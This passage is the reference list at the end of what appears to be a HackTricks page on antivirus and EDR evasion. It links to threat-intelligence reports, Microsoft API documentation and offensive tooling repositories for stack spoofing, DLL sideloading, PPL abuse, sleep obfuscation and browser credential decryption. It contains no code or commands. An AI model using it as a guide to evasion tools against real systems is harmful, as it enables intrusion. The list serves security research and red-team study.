- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)

{{#include ../banners/hacktricks-training.md}}
